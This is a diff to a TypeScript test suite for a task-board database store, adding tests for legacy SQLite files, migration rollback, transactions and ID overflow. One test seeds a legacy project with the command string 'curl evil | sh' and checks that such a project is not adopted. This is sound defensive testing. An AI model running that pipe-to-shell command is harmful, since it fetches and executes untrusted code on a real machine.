@@ -18,6 +18,7 @@ import {
 	RETRO_MARKER,
 	RULES_INTERVIEW_MARKER,
 } from "./prompts.ts";
+import { SQLiteDatabase } from "./sqliteDriver.ts";
 import {
 	adoptSharedProjectData,
 	DEFAULT_SETTINGS,
@@ -40,6 +41,155 @@ const open = async (dbPath: string) => {
 afterAll(async () => {
 	for (const store of opened) await store.close(); // double close is a no-op
 	rmSync(root, { recursive: true, force: true, maxRetries: 5 });
+});
+
+describe("old-driver file compatibility", () => {
+	test("old-driver rows retain IDs, JSON, NULL, flags, milliseconds, costs, and rowid order", async () => {
+		const reference = await open(join(root, "old-driver-schema"));
+		await reference.close();
+		const schema = new Database(join(reference.serverDir, "tasks.db"));
+		const declarations = schema
+			.query<{ sql: string }, []>(
+				"SELECT sql FROM sqlite_master WHERE type = 'table' AND name IN ('settings', 'tasks', 'turns', 'events') ORDER BY name",
+			)
+			.all();
+		schema.close();
+		expect(declarations).toHaveLength(4);
+
+		const dir = join(root, "old-driver-data");
+		mkdirSync(join(dir, ".tasks"), { recursive: true });
+		const file = join(dir, ".tasks", "tasks.db");
+		const legacy = new Database(file, { create: true });
+		const millis = 4_294_967_296_123;
+		const cost = 0.123456789012345;
+		const images = ["O'Brien.png", "λ.png"];
+		const asked = [
+			{ question: "Which?", options: [{ label: "λ" }], multi: false },
+		];
+		const json = JSON.stringify(images);
+		try {
+			for (const { sql } of declarations) legacy.exec(sql);
+			for (const id of ["z-first", "a-second"])
+				legacy.run(
+					`INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at,
+						queued_at, images, asked, research, starred, source_pr_cross_repo)
+					 VALUES (?, ?, ?, 'todo', 'queued', ?, ?, NULL, ?, ?, 1, 0, 1)`,
+					[
+						id,
+						"Legacy λ",
+						"O'Brien\nlegacy prompt",
+						millis,
+						millis + 1,
+						json,
+						JSON.stringify(asked),
+					],
+				);
+			legacy.run("INSERT INTO settings (key, value) VALUES (?, ?)", [
+				"copyExtra",
+				json,
+			]);
+			legacy.run("INSERT INTO settings (key, value) VALUES (?, ?)", [
+				"displayName",
+				"null",
+			]);
+			legacy.run(
+				`INSERT INTO turns (id, task_id, kind, prompt, input, started_at, ended_at, pid, cost)
+				 VALUES (?, 'z-first', 'work', ?, NULL, ?, ?, NULL, ?)`,
+				[8001, "legacy turn λ", millis + 2, millis + 3, cost],
+			);
+			legacy.run(
+				`INSERT INTO events (id, at, task_id, kind, from_value, to_value, detail)
+				 VALUES (?, ?, 'z-first', 'create', NULL, 'todo', ?)`,
+				[9001, millis, "O'Brien λ"],
+			);
+		} finally {
+			legacy.close();
+		}
+
+		const store = await open(dir);
+		expect((await store.listTasks()).map((task) => task.id)).toEqual([
+			"a-second",
+			"z-first",
+		]);
+		expect(await store.getTask("z-first")).toMatchObject({
+			title: "Legacy λ",
+			prompt: "O'Brien\nlegacy prompt",
+			createdAt: millis,
+			updatedAt: millis + 1,
+			queuedAt: null,
+			images,
+			asked,
+			research: true,
+			starred: false,
+			sourcePrCrossRepo: true,
+			sessionId: null,
+		});
+		expect(await store.getSettings()).toMatchObject({
+			copyExtra: images,
+			displayName: null,
+		});
+		expect(await store.listTurns("z-first")).toMatchObject([
+			{
+				id: 8001,
+				prompt: "legacy turn λ",
+				input: null,
+				pid: null,
+				startedAt: millis + 2,
+				endedAt: millis + 3,
+			},
+		]);
+		expect((await store.perfFacts()).turns[0]?.cost).toBe(cost);
+		expect(await store.events()).toMatchObject([
+			{
+				at: millis,
+				taskId: "z-first",
+				kind: "create",
+				from: null,
+				to: "todo",
+				detail: "O'Brien λ",
+			},
+		]);
+		const nextTurn = await store.startTurn("z-first", "work", "new turn", null);
+		expect(nextTurn.id).toBeGreaterThan(8001);
+		await store.createTask("new card");
+		expect(await store.events()).toHaveLength(3);
+		await store.close();
+
+		const oldReader = new Database(file, { readonly: true });
+		try {
+			expect(
+				oldReader
+					.query(
+						"SELECT images, queued_at, research, starred FROM tasks WHERE id = 'z-first'",
+					)
+					.get(),
+			).toEqual({
+				images: json,
+				queued_at: null,
+				research: 1,
+				starred: 0,
+			});
+			expect(
+				oldReader.query("SELECT cost FROM turns WHERE id = 8001").get(),
+			).toEqual({ cost });
+			expect(
+				oldReader
+					.query<{ id: number }, []>("SELECT id FROM events ORDER BY id")
+					.all()
+					.map((event) => event.id),
+			).toEqual([9001, 9002, 9003]);
+			expect(oldReader.query("PRAGMA integrity_check").get()).toEqual({
+				integrity_check: "ok",
+			});
+		} finally {
+			oldReader.close();
+		}
+		const reopened = await open(dir);
+		expect(
+			(await reopened.listTurns("z-first")).map((turn) => turn.id),
+		).toEqual([8001, nextTurn.id]);
+		expect((await reopened.perfFacts()).turns[0]?.cost).toBe(cost);
+	});
 });
 
 describe("reorderQueue", () => {
@@ -2488,6 +2638,103 @@ describe("preparing migration", () => {
 		done_at INTEGER
 	)`;
 
+	test("a failure after the real rebuild swap restores exact legacy DDL, columns, and rows", async () => {
+		const file = join(root, "failed-rebuild.db");
+		const legacy = new Database(file, { create: true });
+		legacy.exec(OLD_TASKS_DDL);
+		legacy.run(
+			`INSERT INTO tasks (id, title, stage, state, created_at, updated_at, images)
+			 VALUES (?, ?, 'todo', 'queued', ?, ?, ?)`,
+			[
+				"legacy",
+				"O'Brien λ",
+				4_294_967_296_123,
+				4_294_967_296_124,
+				'["λ.png"]',
+			],
+		);
+		const before = {
+			ddl: legacy
+				.query<Record<string, unknown>, []>(
+					"SELECT sql FROM sqlite_master WHERE name = 'tasks'",
+				)
+				.get(),
+			columns: legacy
+				.query<Record<string, unknown>, []>("PRAGMA table_info(tasks)")
+				.all(),
+			rows: legacy
+				.query<Record<string, unknown>, []>("SELECT rowid, * FROM tasks")
+				.all(),
+		};
+		const names = legacy
+			.query<{ name: string }, []>("PRAGMA table_info(tasks)")
+			.all()
+			.map((column) => column.name)
+			.join(", ");
+		legacy.close();
+		const db = new SQLiteDatabase(file);
+		const exec = db.exec.bind(db);
+		const failure = new Error("failure after real table swap");
+		let swapped = false;
+		db.exec = async (sql) => {
+			await exec(sql);
+			if (sql === "ALTER TABLE tasks_migrating RENAME TO tasks") {
+				swapped = true;
+				expect(await db.query("SELECT id, title FROM tasks").all()).toEqual([
+					{ id: "legacy", title: "O'Brien λ" },
+				]);
+				throw failure;
+			}
+		};
+		// The private migration seam keeps failure injection outside the product API.
+		const migrations = ProjectStore as unknown as {
+			rebuildTasksOnCheck(
+				db: SQLiteDatabase,
+				sql: string,
+				detect: string,
+				addCols: readonly string[],
+				names: string,
+				label: string,
+			): Promise<string[] | null>;
+		};
+		try {
+			await expect(
+				migrations.rebuildTasksOnCheck(
+					db,
+					OLD_TASKS_DDL,
+					"'queued','running'",
+					[
+						"ALTER TABLE tasks_migrating ADD COLUMN commits INTEGER",
+						"ALTER TABLE tasks_migrating ADD COLUMN done_at INTEGER",
+					],
+					names,
+					"injected",
+				),
+			).rejects.toBe(failure);
+			expect(swapped).toBe(true);
+			expect(
+				await db
+					.query("SELECT sql FROM sqlite_master WHERE name = 'tasks'")
+					.get(),
+			).toEqual(before.ddl);
+			expect(await db.query("PRAGMA table_info(tasks)").all()).toEqual(
+				before.columns,
+			);
+			expect(await db.query("SELECT rowid, * FROM tasks").all()).toEqual(
+				before.rows,
+			);
+			expect(
+				await db
+					.query("SELECT name FROM sqlite_master WHERE name LIKE '%migrating%'")
+					.all(),
+			).toEqual([]);
+			await db.exec("BEGIN");
+			await db.exec("COMMIT");
+		} finally {
+			await db.close();
+		}
+	});
+
 	const laterTaskFields = {
 		pushSha: "check-migration-head",
 		promptAuthor: "board" as const,
@@ -3167,7 +3414,7 @@ describe("OTTR_SERVER_DATA_DIR", () => {
 		const proj = join(base, "checkouts", "proj");
 		mkdirSync(proj, { recursive: true });
 		await legacyDb(data, proj, "bun run release");
-		expect(adoptSharedProjectData(data, server)).toEqual([
+		expect(await adoptSharedProjectData(data, server)).toEqual([
 			{ name: "proj", status: "adopted" },
 		]);
 		expect(existsSync(join(data, "proj", "tasks.db"))).toBe(false);
@@ -3186,7 +3433,7 @@ describe("OTTR_SERVER_DATA_DIR", () => {
 			await store.close();
 		});
 		await legacyDb(data, join(base, "checkouts", "other"), "curl evil | sh");
-		expect(adoptSharedProjectData(data, server)).toEqual([]);
+		expect(await adoptSharedProjectData(data, server)).toEqual([]);
 		expect(existsSync(join(server, "other", "tasks.db"))).toBe(false);
 	});
 
@@ -3210,8 +3457,8 @@ describe("OTTR_SERVER_DATA_DIR", () => {
 				"not a sqlite file at all",
 			);
 			await legacyDb(data, join(base, "checkouts", "good"), "bun run release");
-			const results = adoptSharedProjectData(data, server).sort((a, b) =>
-				a.name.localeCompare(b.name),
+			const results = (await adoptSharedProjectData(data, server)).sort(
+				(a, b) => a.name.localeCompare(b.name),
 			);
 			expect(results.map((r) => [r.name, r.status])).toEqual([
 				["broken", "failed"],
@@ -5770,6 +6017,142 @@ describe("prompt author column", () => {
 });
 
 describe("async store serial operations", () => {
+	for (const fail of [false, true]) {
+		test(`a yielded file transaction isolates unrelated work and ${fail ? "rolls back" : "commits"} nested work`, async () => {
+			const dir = join(root, `async-file-transaction-${fail}`);
+			const store = await open(dir);
+			const other = await open(join(root, `async-independent-${fail}`));
+			await store.setSettings({ taskIdPrefix: "FILE", displayName: "before" });
+			const entered = Promise.withResolvers<void>();
+			const release = Promise.withResolvers<void>();
+			const failure = new Error("callback failure");
+			const transaction = store.transaction(async () => {
+				await store.setSettings({ displayName: "inside" });
+				await store.transaction(async () => {
+					const card = await store.createTask("nested card");
+					await store.updateTask(card.id, { state: "running" });
+				});
+				entered.resolve();
+				await release.promise;
+				if (fail) throw failure;
+			});
+			const result = transaction.then(
+				() => null,
+				(error: unknown) => error,
+			);
+			await entered.promise;
+			let readFinished = false;
+			let writeFinished = false;
+			const unrelatedRead = store.getSettings().then((settings) => {
+				readFinished = true;
+				return settings;
+			});
+			const unrelatedWrite = store.createTask("outside card").then((card) => {
+				writeFinished = true;
+				return card;
+			});
+			try {
+				await other.setSettings({ displayName: "independent" });
+				expect(readFinished).toBe(false);
+				expect(writeFinished).toBe(false);
+			} finally {
+				release.resolve();
+			}
+			expect(await result).toBe(fail ? failure : null);
+			expect((await unrelatedRead).displayName).toBe(
+				fail ? "before" : "inside",
+			);
+			const outside = await unrelatedWrite;
+			expect(outside.id).toBe(fail ? "FILE-1" : "FILE-2");
+			expect((await store.listTasks()).map((card) => card.prompt)).toEqual(
+				fail ? ["outside card"] : ["outside card", "nested card"],
+			);
+			expect(
+				(await store.events()).map((event) => [event.kind, event.to]),
+			).toEqual(
+				fail
+					? [
+							["create", "todo"],
+							["state", "queued"],
+						]
+					: [
+							["create", "todo"],
+							["state", "queued"],
+							["state", "running"],
+							["create", "todo"],
+							["state", "queued"],
+						],
+			);
+			await store.close();
+			const reopened = await open(dir);
+			expect((await reopened.getSettings()).displayName).toBe(
+				fail ? "before" : "inside",
+			);
+			expect(await reopened.listTasks()).toHaveLength(fail ? 1 : 2);
+		});
+	}
+
+	test("unsafe generated public turn and PR run IDs reject without a committed insert", async () => {
+		const dir = join(root, "unsafe-public-ids");
+		const seeded = await open(dir);
+		const task = await seeded.createTask("safe ID boundary");
+		await seeded.close();
+		const file = join(seeded.serverDir, "tasks.db");
+		const raw = new Database(file);
+		try {
+			for (const table of ["turns", "pr_review_runs"])
+				raw.run("INSERT INTO sqlite_sequence (name, seq) VALUES (?, ?)", [
+					table,
+					BigInt(Number.MAX_SAFE_INTEGER) - 1n,
+				]);
+		} finally {
+			raw.close();
+		}
+		const store = await open(dir);
+		const lastSafeTurn = await store.startTurn(
+			task.id,
+			"work",
+			"last safe",
+			null,
+		);
+		expect(lastSafeTurn.id).toBe(Number.MAX_SAFE_INTEGER);
+		expect(await store.startPrRun(12, "safe-head", 123)).toBe(
+			Number.MAX_SAFE_INTEGER,
+		);
+		const events = await store.events();
+		await expect(
+			store.startTurn(task.id, "work", "unsafe turn", null),
+		).rejects.toThrow(RangeError);
+		await expect(store.startPrRun(12, "unsafe-head", 124)).rejects.toThrow(
+			RangeError,
+		);
+		expect(await store.listTurns(task.id)).toEqual([lastSafeTurn]);
+		expect(await store.prReviewRunsSince(0)).toBe(1);
+		expect(await store.events()).toEqual(events);
+		expect((await store.createTask("queue recovers")).prompt).toBe(
+			"queue recovers",
+		);
+		await store.close();
+		const reader = new Database(file, { readonly: true });
+		try {
+			expect(
+				reader
+					.query(
+						"SELECT name, CAST(seq AS TEXT) AS seq FROM sqlite_sequence WHERE name IN ('turns', 'pr_review_runs') ORDER BY name",
+					)
+					.all(),
+			).toEqual([
+				{ name: "pr_review_runs", seq: String(Number.MAX_SAFE_INTEGER) },
+				{ name: "turns", seq: String(Number.MAX_SAFE_INTEGER) },
+			]);
+			expect(reader.query("SELECT head FROM pr_review_runs").all()).toEqual([
+				{ head: "safe-head" },
+			]);
+		} finally {
+			reader.close();
+		}
+	});
+
 	test("concurrent creation preserves IDs, rows, and adjacent lifecycle events", async () => {
 		const store = await open(join(root, "async-create"));
 		await store.setSettings({ taskIdPrefix: "ASYNC" });
